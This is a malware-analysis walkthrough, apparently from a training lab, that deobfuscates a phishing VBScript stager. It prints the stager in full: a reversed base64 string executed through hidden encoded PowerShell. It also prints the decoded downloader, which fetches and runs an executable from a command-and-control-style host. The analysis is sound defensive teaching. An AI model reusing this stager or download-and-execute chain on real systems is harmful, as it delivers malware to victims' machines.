# Phase 2: Multi-Stage Script Deobfuscation

The email body contained a lure link that delivered a VBScript stager (`invoice_stager.vbs`). 

Adversaries frequently wrap initial access in multi-layer encoding to bypass static mail filters.
#### The Obfuscated Stager Payload:

```vbscript
Dim fso, sh, raw_payload, decoded_chars, b64_stage, cmd 
Set fso = CreateObject("Scripting.FileSystemObject") 
Set sh = CreateObject("WScript.Shell") 

' Stage 1: Obfuscated reversed-delimiter array
raw_payload = "==AAiAQZAgHAlBgLAUGAyBQYAcHAsBQYA0GAcBwcAwGAvBwbAQFAcBgOAMEAiAAIAMHAzBQZAMGAvBgcAAFAtAAdAIHAhBAdAMFAgAwOAkCAiAQZAgHAlBgLAUGAyBQYAcHAsBQYA0GAcBwcAwGAvBwbAQFAcBgOAMEAiAAIAwCAiAQZAgHAlBgLAIDAlBwZAEGA0BwcA8CA6BQeAgHAuAwYAkGAmBgZAEGAyBAdA0CAyAwYA8CAvAgOAAHA0BAdAgGAiAAKAUGAsBQaAYEAkBQYA8GAsBgbAcHAvBARA4CAjBwdAQCAgAwOAQHAuBQZAkGAsBwQAIGAlBwVA4CA0BQZA4EAgAAdAMGAlBgaAIGAPBQLAcHAlBgTAACA9AAIAMGA3BAJ" 

' Stage 2: Reverse the payload string 
Function RevString(s)
	Dim out, i
	out = "" 
	For i = Len(s) To 1 Step -1 
	out = out & Mid(s, i, 1) 
	Next RevString = out 
End Function 
b64_stage = RevString(raw_payload) 

' Stage 3: Execution via hidden shell 
cmd = "powershell.exe -w hidden -enc " & b64_stage 
sh.Run cmd, 0, False
```
#### The CyberChef Deconstruction Recipe:
![](assets/cyberchef_recipe.png)
1. **`Reverse ('Character')`**: Inverts the string to counteract the VBScript `RevString` function.
2. **`From Base64 ('Standard')`**: Strips the transport layer encoding.
3. **`Decode text ('UTF-16LE (1200)')`**: Decodes PowerShell's native 2-byte Unicode representation into human-readable ASCII.
#### Deobfuscated Output:
```powershell
$wc = New-Object Net.WebClient; 
$wc.DownloadFile("http://c2-traffic.xyz/stage2.exe", "C:\Tools\malware.exe");
Start-Process "C:\Tools\malware.exe"
```

* **Extracted Capabilities:**
  * Uses `.NET WebClient` to make an outbound HTTP GET request to `http://c2-traffic.xyz/stage2.exe`.
  * Drops the binary payload directly into `C:\Tools\malware.exe`.
  * Silently executes the payload using `Start-Process`.